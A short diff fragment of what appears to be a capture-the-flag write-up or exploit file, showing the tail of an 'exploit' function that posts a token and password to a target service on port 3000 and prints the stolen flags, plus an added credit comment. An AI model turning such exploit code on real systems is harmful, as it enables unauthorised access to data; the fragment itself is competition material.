@@ -206,6 +206,7 @@ def exploit(target, token, flagids=[]):
         # Read flag
         resp = sess.post(f"http://[{target}]:3000/", data={'token': new_token, 'pw': pw}).text
         printflags(resp)
+# Exploit by Ben (not me)
 ```
 
 
